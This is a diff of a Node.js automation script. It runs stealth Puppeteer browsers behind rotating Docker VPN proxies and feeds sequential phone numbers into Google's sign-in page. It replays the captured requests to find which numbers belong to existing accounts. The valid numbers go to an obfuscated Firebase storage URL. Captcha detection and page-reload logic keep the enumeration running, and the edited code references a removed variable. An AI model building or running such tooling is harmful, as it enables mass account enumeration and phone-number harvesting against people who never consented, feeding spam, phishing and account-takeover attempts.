@@ -1,35 +1,43 @@
 const StealthPlugin = require('puppeteer-extra-plugin-stealth')
-const { execFile, exec, spawn } = require('child_process')
+const { execFile } = require('child_process')
 const puppeteer = require('puppeteer-extra')
 const axios = require('axios')
 const path = require('path')
 const util = require('util')
-const http = require('http')
-const tls = require('tls')
 const fs = require('fs')
 const os = require('os')
-
 
 let USER = process.argv.slice(2)[0]
 let ENC_KEY = process.argv.slice(2)[1]
 let ENC_IV = process.argv.slice(2)[2]
 
 let mConfig = null
-let page = null
-let mPendingData = 0
-let mProxyLimit = 0
-let mNumberTask = null
-let mStart = Date.now()
-let mReloadTime = 0
-let itFirstCheck = true
-let isTaskRunning = false
-let isFirstRequest = true
-let pendingResolvers = []
-let mCapture = []
-let mDelayControll = []
+let mNumber = 0
+let mTarget = 0
+let mPage = []
 let mProxy = []
+let mRequest = []
+let mCapture = []
+let mFirstReq = []
+let mDelayControll = []
+let mStart = Date.now()
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
+
+puppeteer.use(StealthPlugin())
+
+
+process.on('message', async (data) => {
+    try {
+        let json = (typeof data === 'string') ? JSON.parse(data) : data
+        if (json.t == 1) {
+            mConfig = json
+        } else if (json.t == 2) {
+            let running = mConfig != null
+            process.send({ t: 3, s: 'controller_status', d: { t:2, r:running, u:json.u, s:USER, a:parseInt((Date.now()-mStart)/1000) } })
+        }
+    } catch (error) {}
+})
 
 
 class Proxy {
@@ -37,9 +45,7 @@ class Proxy {
         workDir: '.vpn-work',
         imageName: 'vpn-proxy',
         containerPrefix: 'openvpn-',
-        connectTimeoutSec: 120,
-        testTimeoutMs: 20000,
-        testHost: 'api.ipify.org',
+        connectTimeoutSec: 120
     }
 
     constructor() {
@@ -60,48 +66,25 @@ class Proxy {
         return await Proxy.execFileP('docker', args, opts)
     }
 
-    static getIpViaProxy(port, timeoutMs) {
-        return new Promise((resolve, reject) => {
-            let host = Proxy.CONFIG.testHost
-            let req = http.request({
-                host: '127.0.0.1',
-                port,
-                method: 'CONNECT',
-                path: `${host}:443`,
-                timeout: timeoutMs,
+    static async getIpViaProxy(port, timeoutMs = 10000) {
+        try {
+            let response = await axios.get('https://api.ipify.org?format=json', {
+                proxy: {
+                    protocol: 'http',
+                    host: '127.0.0.1',
+                    port: port
+                },
+                timeout: timeoutMs
             })
 
-            req.on('timeout', () => req.destroy(new Error('proxy connect timeout')))
-            req.on('error', reject)
-
-            req.on('connect', (res, socket) => {
-                if (res.statusCode !== 200) {
-                    socket.destroy()
-                    return reject(new Error(`CONNECT failed: HTTP ${res.statusCode}`))
-                }
-                let secure = tls.connect({ socket, servername: host }, () => {
-                    secure.write(`GET / HTTP/1.0\r\nHost: ${host}\r\nConnection: close\r\n\r\n`)
-                })
-                let data = ''
-                secure.setTimeout(timeoutMs, () => secure.destroy(new Error('TLS/response timeout')))
-                secure.on('data', (c) => (data += c))
-                secure.on('error', reject)
-                secure.on('end', () => {
-                    let cleanData = data.trim()
-                    
-                    let ipMatch = cleanData.match(/(?:\r\n\r\n|\n\n|^)([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[0-9a-fA-F:]+)/)
-                    let ip = ipMatch ? ipMatch[1].trim() : cleanData.replace(/[^0-9a-fA-F.:]/g, '').trim()
-
-                    if (ip && (ip.includes('.') || ip.includes(':'))) {
-                        resolve(ip)
-                    } else {
-                        reject(new Error('unexpected response: ' + cleanData.slice(0, 80)))
-                    }
-                })
-            })
-
-            req.end()
-        })
+            if (response.data && response.data.ip) {
+                return response.data.ip
+            } else {
+                throw new Error('Invalid response format from ipify');
+            }
+        } catch (error) {
+            throw new Error(`Proxy IP check failed: ${error.message}`);
+        }
     }
 
     async buildImage() {
@@ -180,7 +163,7 @@ class Proxy {
             await Proxy.docker(['exec', '-d', name, 'tinyproxy', '-d', '-c', '/etc/tinyproxy/custom.conf'])
             await Proxy.sleep(2000)
 
-            let proxyIp = await Proxy.getIpViaProxy(port, Proxy.CONFIG.testTimeoutMs)
+            let proxyIp = await Proxy.getIpViaProxy(port)
 
             result.status = true
             result.ip = proxyIp
@@ -237,139 +220,19 @@ class AdaptiveDelay {
     }
 }
 
-class SharedQueue {
-    constructor(maxSize = 100) {
-        this.queue = []
-        this.waitingResolvers = []
-        this.maxSize = maxSize
-        this.count = 0
-        this.isFinished = false
-    }
-
-    addData(data) {
-        if (this.queue.length >= this.maxSize || this.isFinished) {
-            return false
-        }
-
-        if (this.waitingResolvers.length > 0) {
-            let resolve = this.waitingResolvers.shift()
-            resolve(data)
-        } else {
-            this.queue.push(data)
-        }
-        return true
-    }
-
-    async getNumber() {
-        if (this.isFinished || this.count >= this.maxSize) {
-            return null
-        }
-
-        if (this.queue.length > 0) {
-            this.count++
-            return this.queue.shift()
-        }
-
-        return new Promise((resolve) => {
-            let isResolved = false
-            let checkInterval = null
-
-            this.waitingResolvers.push((data) => {
-                if (isResolved) return
-                isResolved = true
-
-                if (checkInterval) clearInterval(checkInterval)
-
-                if (this.isFinished || this.count >= this.maxSize) {
-                    resolve(null)
-                } else {
-                    this.count++
-                    resolve(data)
-                }
-            })
-
-            let maxWaitTime = 30000
-            let intervalTime = 1000
-            let elapsedTime = 0
-
-            checkInterval = setInterval(() => {
-                elapsedTime += intervalTime
-
-                if (this.isFinished || this.count >= this.maxSize || elapsedTime >= maxWaitTime) {
-                    if (!isResolved) {
-                        isResolved = true
-                        clearInterval(checkInterval)
-                        
-                        let index = this.waitingResolvers.indexOf(resolve)
-                        if (index !== -1) {
-                            this.waitingResolvers.splice(index, 1)
-                        }
-                        
-                        resolve(null)
-                    }
-                }
-            }, intervalTime)
-        })
-    }
-
-    finish() {
-        this.isFinished = true
-        while (this.waitingResolvers.length > 0) {
-            let resolve = this.waitingResolvers.shift()
-            resolve(null)
-        }
-    }
-
-    size() {
-        return this.queue.length
-    }
-
-    getCount() {
-        return this.count
-    }
-}
-
-puppeteer.use(StealthPlugin())
-
-
-let mProxyManager = new Proxy()
-
-
-process.on('message', async (data) => {
-    try {
-        let json = (typeof data === 'string') ? JSON.parse(data) : data
-        if (json.t == 1) {
-            if (json.d) {
-                if (json.d.t == 1) {
-                    mConfig = json.d
-                } else if (json.d.t == 2) {
-                    let running = mConfig != null
-                    process.send({ t: 3, s: 'controller_status', d: { t:2, r:running, u:json.u, s:USER, a:parseInt((Date.now()-mStart)/1000) } })
-                }
-            } else {
-                mConfig = json
-            }
-        } else if (json.t == 2) {
-            let running = mConfig != null
-            process.send({ t: 3, s: 'controller_status', d: { t:2, r:running, u:json.u, s:USER, a:parseInt((Date.now()-mStart)/1000) } })
-        }
-    } catch (error) {}
-})
-
-
 startServer()
 
 
 async function startServer() {
+    let mProxyManager = new Proxy()
+
     let cpu = getSystemCpuUsage()
     let ram = getSystemRamUsage()
     console.log(`System CPU: ${cpu}%`)
     console.log(`System RAM: ${ram.usedPercent}% (${ram.usedMB} MB / ${ram.totalMB} MB)`)
+
     await mProxyManager.buildImage()
     console.log('Build Success')
-
-    await installCurlRequest()
-    console.log('Install Success')
 
     mCapture.push(0)
     mDelayControll.push(new AdaptiveDelay())
@@ -387,7 +250,7 @@ async function startServer() {
                 mProxyLimit++
                 mProxy.push('http://127.0.0.1:'+result.port)
                 console.log('Proxy Name: '+result.name)
-                await checkProxyWithAxios(result.port)
+                console.log('IP Address:', result.ip)
                 console.log('Load Time: '+result.time+'s')
                 console.log('--------------------------------')
             } else {
@@ -397,24 +260,13 @@ async function startServer() {
                 console.log('--------------------------------')
             }
         }
-
-        cpu = getSystemCpuUsage()
-        ram = getSystemRamUsage()
-        console.log(`System CPU: ${cpu}%`)
-        console.log(`System RAM: ${ram.usedPercent}% (${ram.usedMB} MB / ${ram.totalMB} MB)`)
-
-        for (let i = 0; i < mProxy.length; i++) {
-            await startBrowser()
-
-            cpu = getSystemCpuUsage()
-            ram = getSystemRamUsage()
-            console.log(i, `System CPU: ${cpu}%`)
-            console.log(i, `System RAM: ${ram.usedPercent}% (${ram.usedMB} MB / ${ram.totalMB} MB)`)
-
-        }
     }
 
-    
+    for (let i = 0; i <= mProxy.length; i++) {
+        await startBrowser()
+    }
+
+    await foundLoginNumber()
 }
 
 async function startBrowser() {
@@ -432,17 +284,28 @@ async function startBrowser() {
             ]
         })
 
-        page = (await browser.pages())[0]
+        let page = (await browser.pages())[0]
 
         page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
 
         await page.setRequestInterception(true)
 
+        let id = mPage.length
+
         page.on('request', async request => {
             try {
                 let url = request.url()
-                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e')) {
-                    loginDataProcess(url, request.headers(), request.postData())
+                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e') && !url.endsWith('request=manually')) {
+                    try {
+                        if (mRequest[id]) {
+                            mRequest[id].resolve({
+                                url: url,
+                                headers: request.headers(),
+                                postData: request.postData()
+                            })
+                            delete mRequest[id]
+                        }
+                    } catch (error) {}
                     
                     let contentType = 'application/json; charset=utf-8'
                     let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')
@@ -460,70 +323,30 @@ async function startBrowser() {
                 request.continue()
             }
         })
+        
+        await loadLoginPage(page)
 
-        console.log('Browser Load Success')
+        mPage.push(page)
+        mFirstReq.push(true)
 
-        await loadLoginPage()
-
-        console.log('Page Load Success')
-
-        // await foundLoginNumber()
+        let cpu = getSystemCpuUsage()
+        let ram = getSystemRamUsage()
+        console.log(`Browser-${mPage.length}: CPU: ${cpu}%, RAM: ${ram.usedPercent}%`)
     } catch (error) {
-        console.log('Browser Error: '+error)
+        console.log(`Browser-${mPage.length} Error: ${error}`)
     }
 }
 
-async function foundLoginNumber() {
-    itFirstCheck = true 
 
+async function foundLoginNumber() {
     while (true) {
         if (mConfig) {
             mStart = Date.now()
 
-            if (mStart > mReloadTime) {
-                console.log('Auto Reload Page')
-                await loadLoginPage()
-            }
-
-            try {
-                for (let i = 0; i < 3; i++) {
-                    let target = mConfig.s
-                    let worker = Math.min(mConfig.b, mProxyLimit)+1
-
-                    mNumberTask = new SharedQueue(target)
-                    
-                    mPendingData = 0
-                    isTaskRunning = true
-
-                    for (let i = 0; i < worker; i++) {
-                        let number = mConfig.n+i
-                        await setLoginRequest(number.toString())
-                    }
-
-                    await waitForFirstStepFinish(worker)
-                    seartNextNumberToken(mConfig.n, worker, target)
-
-                    let result = await workerStart(worker, target, itFirstCheck)
-                    
-                    isTaskRunning = false
-                    await pendingTaskCancel()
-
-                    if (itFirstCheck && result.b) {
-                        console.log('Request Captcha Found')
-                        await loadLoginPage()
-                        await clearDelay()
-                        itFirstCheck = true
-                        continue
-                    } else if (result.c > 20) {
-                        await loadLoginPage()
-                        console.log('Reload Page Success')
-                    }
-
-                    process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:result.f, r:result.r, c:result.c, o:result.o } })
-                    itFirstCheck = false
-                    break
-                }
-            } catch (error) {}
+            mNumber = mConfig.n
+            mTarget = mNumber + mConfig.s
+            let result = await workerStart(Math.min(mConfig.b, mProxy.length)+1, mConfig.s)
+            process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:result.f, r:result.r, c:result.c, o:result.o } })
 
             mConfig = null
         } else {
@@ -532,10 +355,9 @@ async function foundLoginNumber() {
     }
 }
 
-async function workerStart(workerSize, target, firstCheck) {
+async function workerStart(workerSize, target) {
     let workers = []
     let result = {
-        b: false,
         f: 0,
         r: 0,
         c: 0,
@@ -545,25 +367,27 @@ async function workerStart(workerSize, target, firstCheck) {
     let capture = {}
     let timeoutMs = target * 3000
 
-    let globalConsecutiveStatus = 0
     let shouldStop = false
 
     for (let i = 0; i < workerSize; i++) {
         let workerId = i
 
         let workerPromise = (async () => {
+            let sirialError = 0
             while (true) {
                 if (shouldStop) {
                     break
                 }
+                
+                let number = mNumber++
 
-                let task = await mNumberTask.getNumber()
-
-                if (task === null || shouldStop) {
+                if (number >= mTarget) {
                     break
                 }
 
-                let status = await sendRequest(task, workerId)
+                let status = await sendRequest(number, workerId)
+
+                console.log(status, number)
 
                 if (shouldStop) {
                     break
@@ -571,31 +395,33 @@ async function workerStart(workerSize, target, firstCheck) {
 
                 if (status == 1) {
                     result.f++
-                    firstCheck = false
-                    globalConsecutiveStatus = 0
                     if (mConfig) await saveNumber(mConfig.u, mConfig.k, task.number)
                 } else if (status == 2) {
                     result.r++
-                    firstCheck = false
-                    globalConsecutiveStatus = 0
                 } else if (status == 5) {
                     result.c++
-                    mCapture[workerId] = (mCapture[workerId] || 0) + 1
                     let workerKey = workerId.toString()
+                    mCapture[workerId] = (mCapture[workerId] || 0) + 1
                     capture[workerKey] = (capture[workerKey] || 0) + 1
                 } else if (status == 3 || status == 0) {
                     result.o++
                 }
 
-                if (firstCheck && (status == 5 || status == 3 || status == 0)) {
-                    globalConsecutiveStatus++
+                if (mFirstReq[workerId] && (status == 5 || status == 3 || status == 0)) {
+                    sirialError++
                     
-                    if (globalConsecutiveStatus >= 10) {
-                        shouldStop = true
-                        result.b = true
-                        mNumberTask.finish()
-                        break
+                    if (sirialError >= 5) {
+                        sirialError = 0
+                        try {
+                            await loadLoginPage(mPage[workerId])
+                            let cpu = getSystemCpuUsage()
+                            let ram = getSystemRamUsage()
+                            console.log(`Page-${workerId+1} Reload: CPU: ${cpu}%, RAM: ${ram.usedPercent}%`)
+                        } catch (error) {}
                     }
+                } else {
+                    mFirstReq[workerId] = false
+                    sirialError = 0
                 }
 
                 if (shouldStop) {
@@ -614,8 +440,7 @@ async function workerStart(workerSize, target, firstCheck) {
     let timeoutPromise = new Promise((resolve) => {
         timeoutId = setTimeout(() => {
             shouldStop = true
-            mNumberTask.finish()
-            resolve(result)
+            resolve()
         }, timeoutMs)
     })
 
@@ -628,161 +453,78 @@ async function workerStart(workerSize, target, firstCheck) {
         if (timeoutId) clearTimeout(timeoutId)
     }
 
-    mNumberTask.finish()
-
-    if (result.c > 0 && !result.b) {
+    if (result.c > 0) {
         console.log('Capture:', capture)
     }
 
     return result
 }
 
-async function waitForFirstStepFinish(target) {
-    if (mPendingData >= target) return
-
-    return new Promise((resolve) => {
-        let waiter = {
-            target: target,
-            resolve: resolve,
-            timerId: null
-        }
-
-        waiter.timerId = setTimeout(() => {
-            let index = pendingResolvers.indexOf(waiter)
-            if (index !== -1) {
-                pendingResolvers.splice(index, 1)
-                resolve()
-            }
-        }, Math.max(target * 400, 5000))
-
-        pendingResolvers.push(waiter)
-    })
-}
-
-async function pendingTaskCancel() {
+async function sendRequest(number, id) {
     try {
-        if (typeof pendingResolvers !== 'undefined' && pendingResolvers.length > 0) {
-            pendingResolvers.forEach(waiter => {
-                if (waiter.timerId) {
-                    clearTimeout(waiter.timerId)
+        let requestPromise = new Promise((resolve, reject) => {
+            let timer = setTimeout(() => {
+                delete mRequest[id]
+                resolve(null)
+            }, 5000)
+
+            mRequest[id] = {
+                resolve: (data) => {
+                    clearTimeout(timer)
+                    resolve(data)
                 }
-                waiter.resolve()
-            })
-            pendingResolvers = []
-        }
-    } catch (error) {}
-}
+            }
+        })
 
-async function seartNextNumberToken(number, next, target) {
-    let currentNextNum = number + next
-    let processedCount = next
-
-    while (processedCount < target && isTaskRunning) {
-        mPendingData = 0
-
-        for (let i = 0; i < next; i++) {
-            if (processedCount >= target || !isTaskRunning) break
-            let targetNumber = currentNextNum + i
-            await setLoginRequest(targetNumber.toString())
-            processedCount++
-        }
-
-        currentNextNum += next
-        await waitForFirstStepFinish(next)
-    }
-}
-
-async function setLoginRequest(number) {
-    try {
-        page.evaluate((number) => {
+        await mPage[id].evaluate((number) => {
             document.querySelector('input#identifierId').value = number
             document.querySelector('#identifierNext').click()
         }, '+'+number)
 
-        if (isFirstRequest) {
-            for (let i = 0; i < 20; i++) {
-                if(mPendingData > 0) {
-                    break
-                }
-                await delay(250)
-            }
-            isFirstRequest = false
-        }
-    } catch (error) {}
-}
+        let capturedData = await requestPromise
 
-async function loginDataProcess(url, headers, postData) {
-    try {
-        let data = JSON.parse(JSON.parse(Object.fromEntries(new URLSearchParams(postData))['f.req'])[0][0][1])
+        if (capturedData) {
+            let url = capturedData.url
 
-        let number = data[1].replace('+', '')
+            let data = await mPage[id].evaluate(async (u, h, p) => {
+                let res = await fetch(u, {
+                    method: 'POST',
+                    headers: h,
+                    body: p
+                })
 
-        mPendingData++
-        mNumberTask.addData({ number, url, headers, postData })
+                return await res.text()
+            }, url + (url.endsWith('&') ? '' : '&') + 'request=manually', capturedData.headers, capturedData.postData)
 
-        if (pendingResolvers.length > 0) {
-            pendingResolvers = pendingResolvers.filter(waiter => {
-                if (mPendingData >= waiter.target) {
-                    if (waiter.timerId) {
-                        clearTimeout(waiter.timerId)
+            let temp = data.substring(data.indexOf('[['), data.lastIndexOf(']]')-2)
+            temp = temp.substring(0, temp.lastIndexOf(']]')+2)
+
+            let json = JSON.parse(temp)[0]
+            if (json[1] == 'MI613e') {
+                let value = JSON.parse(json[2])
+                if (value[21]) {
+                    let values = JSON.stringify(value[21])
+                    if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
+                        return 1
+                    } else if (values.includes('/v3/signin/challenge/recaptcha')) {
+                        return 2
                     }
-                    waiter.resolve()
-                    return false
+                    return 3
+                } else if (value[18] && value[18][0]) {
+                    return 5
+                } else {
+                    return 4
                 }
-                return true
-            })
-        }
-    } catch (error) {}
-}
-
-async function sendRequest(task, id) {
-    try {
-        let headers = {
-            ...task.headers,
-            'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-            'host': 'accounts.google.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'no-cors',
+            }
         }
         
-        let proxy = id > 0 ? mProxy[id-1] : null
-
-        for (let i = 0; i < 2; i++) {
-            try {
-                let response = await callPythonWithProxy(task.url, headers, task.postData, proxy)
-
-                let json = extractArrays(response.text)[0][0]
-
-                if (json[1] == 'MI613e') {
-                    let value = JSON.parse(json[2])
-                    
-                    if (value[21]) {
-                        let values = JSON.stringify(value[21])
-                        if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
-                            return 1
-                        } else if (values.includes('/v3/signin/challenge/recaptcha')) {
-                            return 2
-                        } else {
-                            return 3
-                        }
-                    } else if (value[18] && value[18][0]) {
-                        return 5
-                    } else {
-                        return 4
-                    }
-                }
-            } catch (error) {
-                await delay(1000)
-            }
-        }
     } catch (error) {}
 
     return 0
 }
 
-async function loadLoginPage() {
-    mReloadTime = Date.now()+1800000
 
+async function loadLoginPage(page) {
     for (let i = 0; i < 3; i++) {
         try {
             await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
@@ -797,11 +539,18 @@ async function loadLoginPage() {
                     root.remove()
                 }
             })
-
-            isFirstRequest = true
             break
         } catch (error) {}
     }
+}
+
+async function saveNumber(user, key, number) {
+    try {
+        await fetch(STORAGE+encodeURIComponent('number/'+user+'/'+key+'/'+number), {
+            method: 'POST',
+            body: ''
+        })
+    } catch (error) {}
 }
 
 async function getVpnConfig(user, key, iv) {
@@ -817,173 +566,6 @@ async function getVpnConfig(user, key, iv) {
     } catch (error) {}
 
     return null
-}
-
-async function updateVpnIp(user, ip, key, iv) {
-    try {
-        let response = await axios.post('https://proxy.raiyanbd.com/update-ip', { user, ip, key, iv })
-
-        if (response.data.success) {
-            return response.data.data
-        }
-    } catch (error) {}
-
-    return null
-}
-
-async function clearDelay() {
-    for (let i = 0; i < mDelayControll.length; i++) {
-        mDelayControll[i] = new AdaptiveDelay()
-        mCapture[i] = 0
-    }
-}
-
-async function checkProxyWithAxios(port) {
-    for (let i = 0; i < 3; i++) {
-        try {
-            let response = await axios.get('https://api.ipify.org?format=json', {
-                proxy: {
-                    protocol: 'http',
-                    host: '127.0.0.1',
-                    port: port
-                },
-                timeout: 10000
-            })
-            
-            console.log('IP Address:', response.data.ip)
-            break
-        } catch (error) {
-            console.log('IP Error:', error.message)
-        }
-    }
-}
-
-
-
-async function installCurlRequest() {
-    try {
-        let execAsync = util.promisify(exec)
-        try {
-            await execAsync('python -c "import curl_cffi"')
-        } catch (e) {
-            await execAsync('pip install curl-cffi', { stdio: 'inherit' })
-        }
-    } catch (error) {}
-}
-
-async function callPythonWithProxy(url, headers, postData, proxy) {
-    return new Promise((resolve, reject) => {
-        let pythonCode = `
-            import sys
-            import json
-            from curl_cffi import requests as cffi_requests
-
-            def main():
-                try:
-                    input_data = sys.stdin.read()
-                    if not input_data:
-                        return
-
-                    payload = json.loads(input_data)
-                    
-                    url = payload.get("url")
-                    headers = payload.get("headers")
-                    post_data = payload.get("postData")
-                    proxy = payload.get("proxy")
-
-                    proxies = None
-                    if proxy:
-                        proxies = {
-                            "http": proxy,
-                            "https": proxy
-                        }
-
-                    response = cffi_requests.post(
-                        url,
-                        headers=headers,
-                        data=post_data,
-                        proxies=proxies,
-                        impersonate="chrome110",
-                        timeout=15
-                    )
-
-                    result = {
-                        "status": response.status_code,
-                        "text": response.text
-                    }
-                    print(json.dumps(result))
-                except Exception as e:
-                    error_result = {"error": str(e)}
-                    print(json.dumps(error_result))
-
-            if __name__ == "__main__":
-                main()
-            `
-
-        let pythonProcess = spawn('python', ['-c', pythonCode])
-        let resultData = ''
-        let errorData = ''
-
-        let payload = {
-            url: url,
-            headers: headers,
-            postData: postData,
-            proxy: proxy
-        }
-
-        pythonProcess.stdin.write(JSON.stringify(payload))
-        pythonProcess.stdin.end()
-
-        pythonProcess.stdout.on('data', (data) => {
-            resultData += data.toString()
-        })
-
-        pythonProcess.stderr.on('data', (data) => {
-            errorData += data.toString()
-        })
-
-        pythonProcess.on('close', (code) => {
-            if (code !== 0) {
-                reject(new Error(`Python process exited with code ${code}: ${errorData}`))
-            } else {
-                try {
-                    const parsedResult = JSON.parse(resultData)
-                    resolve(parsedResult);
-                } catch (e) {
-                    resolve(resultData)
-                }
-            }
-        })
-    })
-}
-
-async function saveNumber(user, key, number) {
-    try {
-        await fetch(STORAGE+encodeURIComponent('number/'+user+'/'+key+'/'+number), {
-            method: 'POST',
-            body: ''
-        })
-    } catch (error) {}
-}
-
-function extractArrays(raw) {
-    raw = raw.replace(/^\)\]\}'\s*/g, '')
-
-    let lines = raw.split('\n')
-
-    let arrays = []
-
-    for (let i = 0; i < lines.length; i++) {
-        let line = lines[i].trim()
-
-        if (line.startsWith('[')) {
-            try {
-                arrays.push(JSON.parse(line))
-            } catch {}
-        }
-    }
-
-    return arrays
 }
 
 function cpuSnapshot() {
